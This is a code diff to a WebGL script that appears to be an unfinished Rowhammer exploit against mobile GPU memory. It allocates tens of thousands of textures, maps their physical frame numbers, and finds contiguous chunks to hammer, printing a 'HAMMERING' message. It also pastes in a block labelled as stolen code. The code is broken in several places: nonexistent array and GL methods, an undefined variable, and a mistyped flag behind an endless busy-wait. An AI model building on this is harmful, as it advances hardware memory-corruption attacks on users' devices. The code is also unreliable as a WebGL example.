@@ -42,6 +42,9 @@ function fill_arrays(arr, len) {
     arr[0] = FIRST_ELEM;
 }
 
+
+// ========================== STOLEN CODE :) =======================================
+// This code initialize browser and setup correct webgl2 context
 var BrowserDetect = {
     init: function () {
       var info = this.searchString(this.dataBrowser) || {identity:"unknown"}
@@ -285,13 +288,19 @@ var BrowserDetect = {
       }
     }
   };
+// ========================== END OF STOLEN CODE :) ==================================
+
+
 
 async function main() {
+    // Initialization procedures
     b = BrowserDetect;
     b.init();
     var canvas = document.getElementById('triangleCanvas');
     var gl = canvas.getContext('webgl2');
     gl.viewport(0,0,canvas.width,canvas.height);
+
+    // Shaders compilation
     var vertexShaderSource = `#version 300 es
     precision mediump float;
     uniform sampler2D row1;
@@ -340,8 +349,8 @@ async function main() {
 
     var fragmentShaderSource = `#version 300 es
     precision mediump float;
-    out vec4 FragColor
-    void main(void){
+    out vec4 FragColor;
+    void main(){
     	FragColor = vec4(0., 0., 0., 1.);
     }`;
     var vertShader = gl.createShader(gl.VERTEX_SHADER);
@@ -350,36 +359,80 @@ async function main() {
     var compiled = gl.getShaderParameter(vertShader, gl.COMPILE_STATUS);
     if(!compiled){
         var compilationLog = gl.getShaderInfoLog(vertShader);
-        console.log('Shader compiler log: ' + compilationLog);
-        //return;
+        console.log('Vertex Shader compiler log: ' + compilationLog);
+        return;
     }
-    
     var fragShader = gl.createShader(gl.FRAGMENT_SHADER);
     gl.shaderSource(fragShader, fragmentShaderSource);
     gl.compileShader(fragShader);
-    
     var compiled = gl.getShaderParameter(fragShader, gl.COMPILE_STATUS);
     if(!compiled){
         var compilationLog = gl.getShaderInfoLog(fragShader);
-        console.log('Shader compiler log: ' + compilationLog);
+        console.log('Fragment Shader compiler log: ' + compilationLog);
         return;
     }
     var prog = gl.createProgram();
     gl.attachShader(prog, vertShader);
     gl.attachShader(prog, fragShader);
     gl.linkProgram(prog);
+
+    // Textures allocation
+    var texs = [];
+    var texdata = []; // data has to be not null. could be on demand allocation
+    for(var i = 0; i < 32; ++i) for(var j  = 0; j < 32; ++j) texdata.append(0xffffffff)
+	for (var i = 0; i < 50000; ++i){
+		texs.append(gl.createTexture())
+		gl.BindTexture(gl.TEXTURE_2D, texs[i]);
+		var level = 0;
+        var internalFormat = gl.RGBA;
+        var border = 0;
+        var format = gl.RGBA;
+        var type = gl.UNSIGNED_BYTE;
+       
+        gl.texImage2D(gl.TEXTURE_2D, level, internalFormat,
+                        targetTextureWidth, targetTextureHeight, border,
+                        format, type, texdata);
+ 
+		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_S, gl.CLAMP_TO_EDGE);
+		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_WRAP_T, gl.CLAMP_TO_EDGE);
+		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.NEAREST);
+		gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.NEAREST);
+	}
+
+    // Since all textures are really allocated in DRAM, now it's time to identify contigious chunks of memory
+
+    var downloadedFlag = false; // very ugly, but I don't want to pu all code in function binded to promise
+    var kgsl = {}
+    get_tex_data().then(function(data){kgsl = data; downloadFlag = true;})
+    /* Example of kgsl entry
+     * {
+     * pfn: 28576
+     * tex_id: 112
+     * tex_size: 1114112
+     * v_addr: 2237923328
+     * }
+    */
+    
+    while(!downloadedFlag); // active waiting, but don't judge me :) 
+
+    kgsl = kgsl.sort(function(a, b){return a.pfn > b.pfn}); // asc order by pfns
+    var kgslmap = []
+    var counter = 1;
+    for(var i = 1; i < kgsl.length; ++i){
+        if(kgsl[i].pfn - kgsl[i - 1].pfn == 0x1000){
+            ++counter;
+            if(counter == 64){
+                counter = 1;
+                kgslmap.append(i - 64);
+            }
+        } 
+    }
+    console.log("Detected <" + kgslmap.length + "> contigious chunks...");
+    console.log("HAMMERING MATHAFAKA...");
     gl.useProgram(prog);
 
     gl.clearColor(1, 0, 1, 1);
     gl.clear(gl.COLOR_BUFFER_BIT);
-
-    // const vertexBuf = gl.createBuffer();
-    // gl.bindBuffer(gl.ARRAY_BUFFER, vertexBuf);
-    // gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([ -0.5,0.5,0.0,  -0.5,-0.5,0.0,  0.5,-0.5,0.0 ]), gl.STATIC_DRAW);
-
-    // const coord = gl.getAttribLocation(prog, "c");
-    // gl.vertexAttribPointer(coord, 3, gl.FLOAT, false, 0, 0);
-    // gl.enableVertexAttribArray(coord);
 
     gl.drawArrays(gl.TRIANGLES, 0, 3);
 
